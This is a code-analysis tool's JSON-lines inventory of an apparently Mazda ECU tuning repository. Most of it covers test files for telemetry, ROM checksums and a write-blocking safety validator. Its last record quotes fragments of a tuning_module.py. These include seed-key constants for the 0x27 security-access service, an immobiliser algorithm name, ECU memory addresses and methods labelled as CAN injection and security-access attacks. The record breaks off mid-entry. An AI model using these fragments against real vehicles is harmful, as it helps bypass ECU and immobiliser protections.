{"file_path": "test_core_system.py", "lines_read": 352, "features_found": [{"type": "function", "name": "test_core_architecture", "line": 17}, {"type": "function", "name": "test_safety_systems", "line": 55}, {"type": "function", "name": "test_connection_monitoring", "line": 101}, {"type": "function", "name": "test_rom_verification", "line": 128}, {"type": "function", "name": "test_gui_integration", "line": 157}, {"type": "function", "name": "test_working_platforms", "line": 197}, {"type": "function", "name": "test_end_to_end_safety", "line": 225}, {"type": "function", "name": "main", "line": 301}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "core.connection_monitor", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.rom_verifier", "line": null}, {"type": "import", "module": "core.rom_verifier", "line": null}, {"type": "import", "module": "PyQt5.QtWidgets", "line": null}, {"type": "import", "module": "gui.main_window", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "get_app_state,", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "PerformanceMode", "line": null}, {"type": "import", "module": "ConnectionHealthMonitor", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "get_rom_verifier", "line": null}, {"type": "import", "module": "ChecksumType", "line": null}, {"type": "import", "module": "QApplication", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "DashboardTab,", "line": null}, {"type": "import", "module": "get_app_state", "line": null}, {"type": "import", "module": "versa1", "line": null}, {"type": "import", "module": "muts3", "line": null}, {"type": "import", "module": "muts6", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_app_state,", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "ECUState", "line": null}, {"type": "import", "module": "traceback", "line": null}], "components_found": [], "algorithms": [], "protocols": [{"type": "protocol", "line": 265, "protocol": "0x[0-9A-Fa-f]+", "content": "response = ecu.send_request(0x2E, 0x01, dangerous_data)"}, {"type": "protocol", "line": 336, "protocol": "CAN", "content": "print(\"  \u2705 ECU communication with CAN bus support\")"}], "hardware_assumptions": [{"type": "hardware", "line": 44, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 45, "hardware": "ECU", "content": "ecu = ECUCommunicator('vcan0')"}, {"type": "hardware", "line": 46, "hardware": "ECU", "content": "assert ecu.get_state().value == 'disconnected'"}, {"type": "hardware", "line": 47, "hardware": "ECU", "content": "print(\"\u2705 ECU communication framework working\")"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "ecu = ECUCommunicator('vcan0')"}, {"type": "hardware", "line": 110, "hardware": "ECU", "content": "monitor = ConnectionHealthMonitor(ecu)"}, {"type": "hardware", "line": 182, "hardware": "ABS", "content": "print(\"\u2705 GUI tabs can be created\")"}, {"type": "hardware", "line": 208, "hardware": "ECU", "content": "print(\"\u2705 versa1.py - VersaTuner ECU extensions working\")"}, {"type": "hardware", "line": 230, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 236, "hardware": "ECU", "content": "ecu = ECUCommunicator('vcan0')"}, {"type": "hardware", "line": 256, "hardware": "ECU", "content": "from core.ecu_communication import ECUState"}, {"type": "hardware", "line": 257, "hardware": "ECU", "content": "original_state = ecu.state"}, {"type": "hardware", "line": 258, "hardware": "ECU", "content": "ecu.state = ECUState.CONNECTED  # Mock connected state"}, {"type": "hardware", "line": 265, "hardware": "ECU", "content": "response = ecu.send_request(0x2E, 0x01, dangerous_data)"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "print(\"\u2705 ECU communicator integrates safety blocking\")"}, {"type": "hardware", "line": 272, "hardware": "ECU", "content": "stats = ecu.get_statistics()"}, {"type": "hardware", "line": 278, "hardware": "ECU", "content": "print(\"\u274c ECU communicator safety integration failed\")"}, {"type": "hardware", "line": 283, "hardware": "ECU", "content": "ecu.state = original_state"}, {"type": "hardware", "line": 336, "hardware": "ECU", "content": "print(\"  \u2705 ECU communication with CAN bus support\")"}, {"type": "hardware", "line": 336, "hardware": "CAN bus", "content": "print(\"  \u2705 ECU communication with CAN bus support\")"}, {"type": "hardware", "line": 339, "hardware": "ECU", "content": "print(\"  \u2705 ROM checksum verification (prevents bricked ECUs)\")"}], "security_logic": [{"type": "security_pattern", "line": 287, "pattern": "password", "content": "assert override_enabled, \"Safety override should enable with correct password\""}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "test_integration.py", "lines_read": 170, "features_found": [{"type": "function", "name": "test_safety_validation_blocks_dangerous_writes", "line": 20}, {"type": "function", "name": "test_safe_parameters_allowed", "line": 54}, {"type": "function", "name": "test_connection_monitoring", "line": 88}, {"type": "function", "name": "test_rom_verification", "line": 110}, {"type": "function", "name": "main", "line": 134}, {"type": "import", "module": "core.ecu_communication", "line": null}, {"type": "import", "module": "core.safety_validator", "line": null}, {"type": "import", "module": "core.app_state", "line": null}, {"type": "import", "module": "utils.logger", "line": null}, {"type": "import", "module": "core.connection_monitor", "line": null}, {"type": "import", "module": "core.rom_verifier", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "ECUCommunicator", "line": null}, {"type": "import", "module": "get_safety_validator", "line": null}, {"type": "import", "module": "get_app_state,", "line": null}, {"type": "import", "module": "get_logger", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "ConnectionHealthMonitor", "line": null}, {"type": "import", "module": "get_rom_verifier", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 12, "hardware": "ECU", "content": "from core.ecu_communication import ECUCommunicator"}, {"type": "hardware", "line": 95, "hardware": "ECU", "content": "ecu = ECUCommunicator('vcan0')"}, {"type": "hardware", "line": 96, "hardware": "ECU", "content": "monitor = ConnectionHealthMonitor(ecu)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "test_platform_imports.py", "lines_read": 103, "features_found": [{"type": "function", "name": "test_file_import", "line": 17}, {"type": "function", "name": "main", "line": 40}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "errors", "line": null}, {"type": "import", "module": "sys", "line": null}, {"type": "import", "module": "os", "line": null}, {"type": "import", "module": "importlib.util", "line": null}, {"type": "import", "module": "traceback", "line": null}, {"type": "import", "module": "Path", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "test_real_time_telemetry.py", "lines_read": 196, "features_found": [{"type": "function", "name": "mock_can_bus", "line": 9}, {"type": "function", "name": "telemetry", "line": 16}, {"type": "function", "name": "test_telemetry_initialization", "line": 20}, {"type": "function", "name": "test_start_stop_telemetry", "line": 27}, {"type": "function", "name": "test_can_message_processing", "line": 40}, {"type": "function", "name": "test_performance_metrics", "line": 64}, {"type": "function", "name": "test_telemetry_metric_updates", "line": 83}, {"type": "function", "name": "test_can_decoder", "line": 114}, {"type": "function", "name": "__init__", "line": 145}, {"type": "function", "name": "recv", "line": 148}, {"type": "import", "module": "unittest.mock", "line": null}, {"type": "import", "module": "RealTimeTelemetry", "line": null}, {"type": "import", "module": "unittest.mock", "line": null}, {"type": "import", "module": "pytest", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "MagicMock,", "line": null}, {"type": "import", "module": "RealTimeTelemetry,", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "MagicMock", "line": null}, {"type": "import", "module": "random", "line": null}, {"type": "import", "module": "can", "line": null}, {"type": "import", "module": "asyncio", "line": null}], "components_found": [{"type": "class", "name": "MockCANBus", "line": 144}], "algorithms": [], "protocols": [{"type": "protocol", "line": 5, "protocol": "CAN", "content": "from RealTimeTelemetry import RealTimeTelemetry, CANMessageDecoder, TelemetryMetric, CAN_ID"}, {"type": "protocol", "line": 10, "protocol": "CAN", "content": "\"\"\"Create a mock CAN bus interface.\"\"\""}, {"type": "protocol", "line": 17, "protocol": "CAN", "content": "\"\"\"Create a telemetry instance with a mock CAN bus.\"\"\""}, {"type": "protocol", "line": 41, "protocol": "CAN", "content": "\"\"\"Test processing of CAN messages.\"\"\""}, {"type": "protocol", "line": 44, "protocol": "CAN", "content": "arbitration_id=CAN_ID.ENGINE_RPM.value,"}, {"type": "protocol", "line": 49, "protocol": "CAN", "content": "arbitration_id=CAN_ID.BOOST_PRESSURE.value,"}, {"type": "protocol", "line": 115, "protocol": "CAN", "content": "\"\"\"Test CAN message decoding functions.\"\"\""}, {"type": "protocol", "line": 116, "protocol": "CAN", "content": "decoder = CANMessageDecoder()"}, {"type": "protocol", "line": 140, "protocol": "CAN", "content": "\"\"\"Integration test with a simulated CAN bus.\"\"\""}, {"type": "protocol", "line": 144, "protocol": "CAN", "content": "class MockCANBus:"}, {"type": "protocol", "line": 162, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.ENGINE_RPM.value, data=data)"}, {"type": "protocol", "line": 167, "protocol": "CAN", "content": "return can.Message(arbitration_id=CAN_ID.BOOST_PRESSURE.value, data=data)"}, {"type": "protocol", "line": 172, "protocol": "CAN", "content": "can_bus = MockCANBus()"}], "hardware_assumptions": [{"type": "hardware", "line": 10, "hardware": "CAN bus", "content": "\"\"\"Create a mock CAN bus interface.\"\"\""}, {"type": "hardware", "line": 17, "hardware": "CAN bus", "content": "\"\"\"Create a telemetry instance with a mock CAN bus.\"\"\""}, {"type": "hardware", "line": 61, "hardware": "ABS", "content": "assert abs(telemetry.get_metric_value('rpm') - 3000) < 0.1"}, {"type": "hardware", "line": 62, "hardware": "ABS", "content": "assert abs(telemetry.get_metric_value('boost') - 10.0) < 0.1"}, {"type": "hardware", "line": 78, "hardware": "ABS", "content": "assert abs(metrics['avg_loop_time_ms'] - 10.0) < 0.1  # 10ms average"}, {"type": "hardware", "line": 79, "hardware": "ABS", "content": "assert abs(metrics['min_loop_time_ms'] - 8.0) < 0.1"}, {"type": "hardware", "line": 80, "hardware": "ABS", "content": "assert abs(metrics['max_loop_time_ms'] - 12.0) < 0.1"}, {"type": "hardware", "line": 81, "hardware": "ABS", "content": "assert abs(metrics['cpu_usage_percent'] - 100.0) < 1.0  # ~100% CPU usage"}, {"type": "hardware", "line": 101, "hardware": "ABS", "content": "assert abs(metric.stats['avg'] - 3.0) < 0.001"}, {"type": "hardware", "line": 120, "hardware": "ABS", "content": "assert abs(decoder.decode_rpm(rpm_data) - 3000) < 0.1"}, {"type": "hardware", "line": 124, "hardware": "ABS", "content": "assert abs(decoder.decode_boost(boost_data) - 15.0) < 0.1"}, {"type": "hardware", "line": 128, "hardware": "ABS", "content": "assert abs(decoder.decode_afr(afr_data) - 14.7) < 0.01"}, {"type": "hardware", "line": 132, "hardware": "ABS", "content": "assert abs(decoder.decode_ignition(timing_data) - 10.0) < 0.1"}, {"type": "hardware", "line": 136, "hardware": "ABS", "content": "assert abs(decoder.decode_coolant_temp(temp_data) - 90.0) < 0.1"}, {"type": "hardware", "line": 140, "hardware": "CAN bus", "content": "\"\"\"Integration test with a simulated CAN bus.\"\"\""}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tests/test_comms.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tests/test_diagnostics.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["diagnostic"]}
{"file_path": "tests/test_live_data_service.py", "lines_read": 56, "features_found": [{"type": "function", "name": "test_read_all_live_data", "line": 9}, {"type": "function", "name": "read_data_by_id_side_effect", "line": 13}, {"type": "import", "module": "unittest.mock", "line": null}, {"type": "import", "module": "diagnostics.live_data_service", "line": null}, {"type": "import", "module": "unittest", "line": null}, {"type": "import", "module": "MagicMock", "line": null}, {"type": "import", "module": "LiveDataService,", "line": null}], "components_found": [{"type": "class", "name": "TestLiveDataService", "line": 8}], "algorithms": [], "protocols": [{"type": "protocol", "line": 14, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x0C:"}, {"type": "protocol", "line": 16, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x11:"}, {"type": "protocol", "line": 18, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x04:"}, {"type": "protocol", "line": 20, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x70:"}, {"type": "protocol", "line": 22, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x5A:"}, {"type": "protocol", "line": 24, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x0E:"}, {"type": "protocol", "line": 26, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x0F:"}, {"type": "protocol", "line": 28, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x05:"}, {"type": "protocol", "line": 30, "protocol": "0x[0-9A-Fa-f]+", "content": "if did == 0x0D:"}], "hardware_assumptions": [{"type": "hardware", "line": 51, "hardware": "vehicle", "content": "self.assertEqual(live_data.vehicle_speed_kph, 100)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tests/test_queue.py", "lines_read": 7, "features_found": [{"type": "function", "name": "test_queue_drain", "line": 3}, {"type": "import", "module": "muts.services.queue", "line": null}, {"type": "import", "module": "ECUQueue", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 1, "hardware": "ECU", "content": "from muts.services.queue import ECUQueue"}, {"type": "hardware", "line": 4, "hardware": "ECU", "content": "q = ECUQueue()"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tests/test_security.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["security"]}
{"file_path": "tests/test_tuning.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tests/test_ui_smoke.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tools/export_tune_to_csv.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tools/generate_dummy_logs.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tools/import_stock_rom.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["other"]}
{"file_path": "tuning/boost_control.py", "lines_read": 13, "features_found": [{"type": "function", "name": "derive_boost_from_load", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [], "algorithms": [{"type": "algorithm_function", "line": 6, "content": "def derive_boost_from_load(load_table: \"np.ndarray\", base_psi: float = 14.7) -> \"np.ndarray\":"}], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/fueling_control.py", "lines_read": 13, "features_found": [{"type": "function", "name": "enrich_wot", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/ignition_control.py", "lines_read": 9, "features_found": [{"type": "function", "name": "apply_knock_margin", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/load_targeting.py", "lines_read": 17, "features_found": [{"type": "function", "name": "smooth_table", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "numpy", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/map_editor.py", "lines_read": 3, "features_found": [], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/models.py", "lines_read": 30, "features_found": [{"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "pydantic", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "BaseModel", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "TorqueConfig", "line": 7}, {"type": "class", "name": "PerformanceFeaturesConfig", "line": 10}, {"type": "class", "name": "TuneConfiguration", "line": 19}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/performance_features.py", "lines_read": 13, "features_found": [{"type": "function", "name": "describe_features", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": ".models", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "PerformanceFeaturesConfig", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/rom_manager.py", "lines_read": 46, "features_found": [{"type": "function", "name": "__init__", "line": 16}, {"type": "function", "name": "load_rom", "line": 20}, {"type": "function", "name": "save_rom", "line": 23}, {"type": "function", "name": "read_map", "line": 26}, {"type": "function", "name": "write_map", "line": 38}, {"type": "function", "name": "update_checksum", "line": 44}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "core.checksum", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "Any,", "line": null}, {"type": "import", "module": "yaml", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "calculate", "line": null}], "components_found": [{"type": "class", "name": "RomManager", "line": 15}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/swas_manager.py", "lines_read": 15, "features_found": [{"type": "function", "name": "__init__", "line": 7}, {"type": "function", "name": "is_enabled", "line": 10}, {"type": "function", "name": "set_enabled", "line": 13}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "diagnostics.bcm_module", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "BcmModule", "line": null}], "components_found": [{"type": "class", "name": "SwasManager", "line": 6}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 4, "hardware": "BCM", "content": "from diagnostics.bcm_module import BcmModule"}, {"type": "hardware", "line": 7, "hardware": "BCM", "content": "def __init__(self, bcm: BcmModule):"}, {"type": "hardware", "line": 8, "hardware": "BCM", "content": "self.bcm = bcm"}, {"type": "hardware", "line": 11, "hardware": "BCM", "content": "return self.bcm.read_swas_state().enabled"}, {"type": "hardware", "line": 14, "hardware": "BCM", "content": "self.bcm.set_swas_state(enabled)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/torque_manager.py", "lines_read": 9, "features_found": [{"type": "function", "name": "clamp_torque_per_gear", "line": 6}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "Dict", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning/tune_profile_manager.py", "lines_read": 28, "features_found": [{"type": "function", "name": "__init__", "line": 11}, {"type": "function", "name": "list_profiles", "line": 15}, {"type": "function", "name": "save_profile", "line": 18}, {"type": "function", "name": "load_profile", "line": 24}, {"type": "import", "module": "__future__", "line": null}, {"type": "import", "module": "pathlib", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": ".models", "line": null}, {"type": "import", "module": "annotations", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "Path", "line": null}, {"type": "import", "module": "List", "line": null}, {"type": "import", "module": "TuneConfiguration", "line": null}], "components_found": [{"type": "class", "name": "TuneProfileManager", "line": 10}], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["tuning"]}
{"file_path": "tuning_module.py", "lines_read": 400, "features_found": [{"type": "function", "name": "start_autonomous_tuning", "line": 340}, {"type": "function", "name": "__init__", "line": 28}, {"type": "function", "name": "_read_vin", "line": 33}, {"type": "function", "name": "reverse_engineer_seed_key", "line": 38}, {"type": "function", "name": "_mazda_27_algorithm", "line": 65}, {"type": "function", "name": "_mazda_tcm_algorithm", "line": 75}, {"type": "function", "name": "_mazda_immobilizer_algorithm", "line": 85}, {"type": "function", "name": "_derive_vin_key", "line": 95}, {"type": "function", "name": "map_ecu_memory", "line": 103}, {"type": "function", "name": "__init__", "line": 131}, {"type": "function", "name": "define_safety_limits", "line": 136}, {"type": "function", "name": "real_time_optimization", "line": 148}, {"type": "function", "name": "_optimize_timing", "line": 160}, {"type": "function", "name": "_optimize_boost", "line": 172}, {"type": "function", "name": "_optimize_fuel", "line": 182}, {"type": "function", "name": "_optimize_vvt", "line": 188}, {"type": "function", "name": "_apply_safety_limits", "line": 198}, {"type": "function", "name": "_learn_from_optimization", "line": 208}, {"type": "function", "name": "__init__", "line": 222}, {"type": "function", "name": "enumerate_j2534_exploits", "line": 229}, {"type": "function", "name": "execute_memory_dump", "line": 254}, {"type": "function", "name": "_build_read_memory_payload", "line": 270}, {"type": "function", "name": "__init__", "line": 282}, {"type": "function", "name": "_receive_seed", "line": 288}, {"type": "function", "name": "enumerate_ecu_ids", "line": 293}, {"type": "function", "name": "inject_diagnostic_session", "line": 304}, {"type": "function", "name": "security_access_attack", "line": 317}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "struct", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}, {"type": "import", "module": "can", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUExploit", "line": 25}, {"type": "class", "name": "AutonomousTuner", "line": 128}, {"type": "class", "name": "DiagnosticExploits", "line": 219}, {"type": "class", "name": "CANInjection", "line": 279}], "algorithms": [{"type": "algorithm_function", "line": 65, "content": "def _mazda_27_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 75, "content": "def _mazda_tcm_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 85, "content": "def _mazda_immobilizer_algorithm(self, seed):"}, {"type": "algorithm_function", "line": 95, "content": "def _derive_vin_key(self):"}], "protocols": [{"type": "protocol", "line": 21, "protocol": "CAN", "content": "logging.warning(\"The 'python-can' library is not installed. CAN communication will not be available."}, {"type": "protocol", "line": 42, "protocol": "0x[0-9A-Fa-f]+", "content": "'description': 'Main ECU security access (0x27)',"}, {"type": "protocol", "line": 66, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"MAIN ECU 0x27 SECURITY ALGORITHM - FACTORY DEALER LEVEL\"\"\""}, {"type": "protocol", "line": 70, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (seed_bytes[i] ^ 0x73) + i"}, {"type": "protocol", "line": 71, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] & 0xFF) ^ 0xA9"}, {"type": "protocol", "line": 72, "protocol": "0x[0-9A-Fa-f]+", "content": "key[i] = (key[i] + 0x1F) & 0xFF"}, {"type": "protocol", "line": 79, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] = ((seed_bytes[0] << 2) | (seed_bytes[0] >> 6)) & 0xFF"}, {"type": "protocol", "line": 80, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] = ((seed_bytes[1] >> 3) | (seed_bytes[1] << 5)) & 0xFF"}, {"type": "protocol", "line": 81, "protocol": "0x[0-9A-Fa-f]+", "content": "key[0] ^= 0x47"}, {"type": "protocol", "line": 82, "protocol": "0x[0-9A-Fa-f]+", "content": "key[1] ^= 0x11"}, {"type": "protocol", "line": 107, "protocol": "0x[0-9A-Fa-f]+", "content": "'ignition_timing': {'address': 0xFFA000, 'size': 0x800, 'description': '16x16 ignition map'},"}, {"type": "protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_maps': {'address': 0xFFA800, 'size': 0x800, 'description': '16x16 fuel map'},"}, {"type": "protocol", "line": 109, "protocol": "0x[0-9A-Fa-f]+", "content": "'boost_control': {'address': 0xFFB000, 'size': 0x400, 'description': 'Boost target maps'},"}, {"type": "protocol", "line": 110, "protocol": "0x[0-9A-Fa-f]+", "content": "'vvt_maps': {'address': 0xFFB400, 'size': 0x400, 'description': 'Variable valve timing'},"}, {"type": "protocol", "line": 111, "protocol": "0x[0-9A-Fa-f]+", "content": "'rev_limit': {'address': 0xFFB800, 'size': 0x100, 'description': 'RPM limiters'},"}, {"type": "protocol", "line": 112, "protocol": "0x[0-9A-Fa-f]+", "content": "'speed_limit': {'address': 0xFFB900, 'size': 0x100, 'description': 'Speed governor'}"}, {"type": "protocol", "line": 115, "protocol": "0x[0-9A-Fa-f]+", "content": "'knock_learn': {'address': 0xFFC000, 'size': 0x200, 'description': 'Knock adaptation'},"}, {"type": "protocol", "line": 116, "protocol": "0x[0-9A-Fa-f]+", "content": "'fuel_trim': {'address': 0xFFC200, 'size': 0x200, 'description': 'Long/short term fuel trims'},"}, {"type": "protocol", "line": 117, "protocol": "0x[0-9A-Fa-f]+", "content": "'throttle_adapt': {'address': 0xFFC400, 'size': 0x100, 'description': 'Throttle body learning'},"}, {"type": "protocol", "line": 118, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_adapt': {'address': 0xFFC500, 'size': 0x300, 'description': 'Transmission adaptation'}"}, {"type": "protocol", "line": 121, "protocol": "0x[0-9A-Fa-f]+", "content": "'bootloader': {'address': 0xFF0000, 'size': 0x1000, 'description': 'Boot sector - reprogramming'},"}, {"type": "protocol", "line": 122, "protocol": "0x[0-9A-Fa-f]+", "content": "'security_registers': {'address': 0xFFFF00, 'size': 0x100, 'description': 'Security access control'}"}, {"type": "protocol", "line": 123, "protocol": "0x[0-9A-Fa-f]+", "content": "'checksum_area': {'address': 0xFFFFF0, 'size': 0x10, 'description': 'ECU checksums'}"}, {"type": "protocol", "line": 225, "protocol": "CAN", "content": "self.can_injection = CANInjection()"}, {"type": "protocol", "line": 230, "protocol": "J2534", "content": "\"\"\"J2534 PROTOCOL VULNERABILITIES\"\"\""}, {"type": "protocol", "line": 235, "protocol": "CAN", "content": "'exploit': 'CAN ID spoofing + sequence number prediction'"}, {"type": "protocol", "line": 240, "protocol": "0x[0-9A-Fa-f]+", "content": "'exploit': 'Exploit 0x23 0x2A 0x3D services'"}, {"type": "protocol", "line": 244, "protocol": "0x[0-9A-Fa-f]+", "content": "'target': '0x27 security service',"}, {"type": "protocol", "line": 271, "protocol": "0x[0-9A-Fa-f]+", "content": "\"\"\"BUILD 0x23 READ MEMORY PAYLOAD\"\"\""}, {"type": "protocol", "line": 273, "protocol": "0x[0-9A-Fa-f]+", "content": "payload.append(0x23)"}, {"type": "protocol", "line": 279, "protocol": "CAN", "content": "class CANInjection:"}, {"type": "protocol", "line": 280, "protocol": "CAN", "content": "\"\"\"ADVANCED CAN BUS MESSAGE INJECTION\"\"\""}, {"type": "protocol", "line": 